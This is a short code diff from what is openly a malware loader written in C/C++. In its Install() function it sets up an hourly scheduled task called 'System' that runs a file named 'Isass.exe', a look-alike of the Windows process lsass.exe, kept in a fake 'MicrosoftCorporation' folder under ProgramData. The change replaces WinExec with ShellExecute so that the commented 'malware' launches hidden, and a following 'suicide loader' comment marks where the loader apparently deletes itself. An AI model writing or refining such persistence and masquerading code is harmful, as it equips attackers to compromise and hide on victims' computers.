@@ -71,7 +71,7 @@ void Install()
 	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
 
 	// starting malware
-	WinExec("C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", SW_HIDE);
+	ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe"), 0, 0, SW_HIDE);
 
 	// suicide loader
 	char current_work_dir[FILENAME_MAX];
